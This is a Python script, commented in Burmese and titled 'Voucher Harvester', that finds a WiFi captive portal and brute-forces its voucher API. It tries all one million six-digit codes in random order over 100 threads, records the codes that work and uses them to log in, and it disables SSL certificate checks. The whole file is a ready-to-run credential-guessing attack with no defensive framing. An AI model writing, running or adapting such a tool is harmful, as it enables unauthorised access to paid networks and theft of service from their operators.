import requests
import re
import urllib3
import time
import threading
import random
from datetime import datetime, timedelta
import sys
import os
import ssl

# --- SSL ERROR FIX ---
ssl._create_default_https_context = ssl._create_unverified_context
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# --- CONFIGURATION ---
TRIED_CODES_FILE = "tried_codes.txt"
SUCCESS_CODES_FILE = "success.txt"
VOUCHER_THREADS = 100 

# --- CLEAR SCREEN FUNCTION ---
def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

# --- CACHE MANAGEMENT ---
def load_tried_codes():
    if not os.path.exists(TRIED_CODES_FILE):
        return set()
    with open(TRIED_CODES_FILE, "r") as f:
        return set(line.strip() for line in f)

def save_tried_code(code):
    with open(TRIED_CODES_FILE, "a") as f:
        f.write(f"{code}\n")

def save_success_code(code):
    with open(SUCCESS_CODES_FILE, "a") as f:
        f.write(f"{code}\n")

# --- MENU SYSTEM ---
def show_menu():
    clear_screen()
    print("========================================")
    print("         🛠️  VOUCHER HARVESTER          ")
    print("========================================")
    print("1. 🌐 Internet Access (Use Success Code)")
    print("2. 🔍 Test Specific Code")
    print("3. 🔍 Fast Random Voucher Harvesting")
    print("4. 📋 View Success Codes")
    print("========================================\n")
    choice = input("👉 ရွေးချယ်ပါ (1-4): ")
    return choice

# --- PORTAL AUTO DETECT ---
def get_portal_info():
    """Captive Portal URL ကို အလိုအလျောက်ရှာဖွေခြင်း"""
    test_url = "http://connectivitycheck.gstatic.com/generate_204"
    try:
        r = requests.get(test_url, allow_redirects=True, timeout=5)
        if r.url != test_url:
            from urllib.parse import urlparse
            parsed = urlparse(r.url)
            return f"{parsed.scheme}://{parsed.netloc}", r.url
    except:
        pass
    return None, None

# --- FAST RANDOM VOUCHER HARVESTING LOGIC ---
def test_code(code, portal_host, sid, session):
    """တစ်ခုချင်းစီကို Thread နဲ့စမ်းသပ်သည့် function"""
    voucher_api = f"{portal_host}/api/auth/voucher/"
    try:
        # --- API CALL စမ်းသပ်သည့်နေရာ ---
        v_res = session.post(voucher_api, json={'accessCode': code, 'sessionId': sid, 'apiVersion': 1}, timeout=3)
        
        # --- RESPONSE စစ်ဆေးခြင်း ---
        if v_res.status_code == 200:
            # တိကျစွာစစ်ဆေးခြင်း (Response text တွင် "success" ဟု တိတိကျကျပါမှ ယူမည်)
            if "\"success\"" in v_res.text:
                print(f"\n\033[92m✅ SUCCESS! Valid Code Found: {code}\033[0m")
                save_success_code(code)
                return True
            else:
                pass
    except:
        pass
    
    save_tried_code(code)
    # Fail ဖြစ်ပါက ဘာမှမပြဘဲနေမည် (Silent)
    return False

def start_voucher_harvesting():
    print(f"\n🔍 Voucher Code ရှာဖွေခြင်း အရှိန်မြှင့် စတင်ပြီ...")
    tried_codes = load_tried_codes()
    print(f"📚 စမ်းသပ်ပြီးသား Code {len(tried_codes)} ခု ကျော်လွှားမည်။")

    portal_host, portal_url = get_portal_info()
    if not portal_host:
        print("❌ Captive Portal ကို ရှာမတွေ့ပါ။ WiFi သေချာချိတ်ပါ။")
        return

    # SID ယူခြင်း
    session = requests.Session()
    try:
        r2 = session.get(portal_url, verify=False, timeout=10)
        sid_match = re.search(r'sessionId=([a-zA-Z0-9]+)', r2.text)
        sid = sid_match.group(1) if sid_match else "unknown"
    except:
        sid = "unknown"

    threads = []
    
    # 000000 ကနေ 999999 ထိ Random ယူမည်
    all_codes = list(range(1000000))
    random.shuffle(all_codes) # --- RANDOM လုပ်ခြင်း ---

    for code_int in all_codes:
        code = f"{code_int:06d}"
        if code in tried_codes:
            continue
        
        # Thread အများကြီးနဲ့ စမ်းသပ်ခြင်း
        t = threading.Thread(target=test_code, args=(code, portal_host, sid, session))
        threads.append(t)
        t.start()
        
        # Threads အရေအတွက် ထိန်းချုပ်ခြင်း
        if len(threads) >= VOUCHER_THREADS:
            for t in threads:
                t.join()
            threads = []
            
        print(f"\r🔍 Random စမ်းသပ်နေသည်: {code}", end="", flush=True)

# --- INTERNET ACCESS LOGIC ---
def use_internet_access():
    print("\n🌐 Internet Access အတွက် Code စစ်ဆေးနေသည်...")
    
    if not os.path.exists(SUCCESS_CODES_FILE):
        print("❌ Success Codes များမရှိပါ။")
        time.sleep(2)
        return

    with open(SUCCESS_CODES_FILE, "r") as f:
        codes = f.readlines()
        if not codes:
            print("❌ Success Codes များမရှိပါ။")
            time.sleep(2)
            return
        code = codes[-1].strip() # နောက်ဆုံးရတဲ့ code ကိုသုံးမယ်

    print(f"📡 သုံးစွဲမည့် Code: {code}")
    
    portal_host, portal_url = get_portal_info()
    if not portal_host:
        print("❌ Captive Portal ကို ရှာမတွေ့ပါ။")
        return

    # SID ယူခြင်း
    session = requests.Session()
    try:
        r2 = session.get(portal_url, verify=False, timeout=10)
        sid_match = re.search(r'sessionId=([a-zA-Z0-9]+)', r2.text)
        sid = sid_match.group(1) if sid_match else "unknown"
    except:
        sid = "unknown"
    
    voucher_api = f"{portal_host}/api/auth/voucher/"
    
    try:
        # Code အသုံးပြုခြင်း
        v_res = session.post(voucher_api, json={'accessCode': code, 'sessionId': sid, 'apiVersion': 1}, timeout=5)
        
        # --- RESPONSE စစ်ဆေးခြင်း ---
        if v_res.status_code == 200 and "\"success\"" in v_res.text:
            print(f"\n\033[92m✅ SUCCESS! Internet Access Connected with Code: {code}\033[0m")
        else:
            print(f"\n❌ FAIL! Cannot connect with code: {code}")
            
    except Exception as e:
        print(f"\n❌ Error: {e}")
    
    time.sleep(3)

# --- SPECIFIC CODE TESTER ---
def test_specific_code():
    code_to_test = input("\n👉 စမ်းသပ်လိုသည့် Code ကိုရိုက်ပါ: ")
    print(f"\n🔍 စမ်းသပ်နေသည်: {code_to_test} ...")
    
    portal_host, portal_url = get_portal_info()
    if not portal_host:
        print("❌ Captive Portal ကို ရှာမတွေ့ပါ။ WiFi သေချာချိတ်ပါ။")
        return

    # SID ယူခြင်း
    session = requests.Session()
    try:
        r2 = session.get(portal_url, verify=False, timeout=10)
        sid_match = re.search(r'sessionId=([a-zA-Z0-9]+)', r2.text)
        sid = sid_match.group(1) if sid_match else "unknown"
    except:
        sid = "unknown"
    
    voucher_api = f"{portal_host}/api/auth/voucher/"
    
    try:
        # API ကို JSON data ဖြင့် post လုပ်ခြင်း
        v_res = session.post(voucher_api, json={'accessCode': code_to_test, 'sessionId': sid, 'apiVersion': 1}, timeout=5)
        
        # --- RESPONSE အပြည့်အစုံကို ပြသခြင်း (DEBUG) ---
        print(f"📡 Server Response: {v_res.text}")
        
        # --- တိကျစွာစစ်ဆေးခြင်း (Response text တွင် "success" ဟု တိတိကျကျပါမှ ယူမည်) ---
        if v_res.status_code == 200 and "\"success\"" in v_res.text:
            print(f"\n\033[92m✅ SUCCESS! Valid Code Found: {code_to_test}\033[0m")
            save_success_code(code_to_test)
        else:
            print(f"\n❌ FAIL! Invalid Code or Server rejected: {code_to_test}")
            
    except Exception as e:
        print(f"\n❌ Error: {e}")
    
    time.sleep(3)

# --- MAIN RUNNER ---
if __name__ == "__main__":
    choice = show_menu()
    if choice == '1':
        use_internet_access()
    elif choice == '2':
        test_specific_code()
    elif choice == '3':
        start_voucher_harvesting()
    elif choice == '4':
        print("\n📋 Success Code များ:")
        if os.path.exists(SUCCESS_CODES_FILE):
            with open(SUCCESS_CODES_FILE, "r") as f:
                print(f.read())
        else:
            print("No success codes found.")
        time.sleep(5)
    else:
        print("🚫 မှားယွင်းသော ရွေးချယ်မှု။")
        
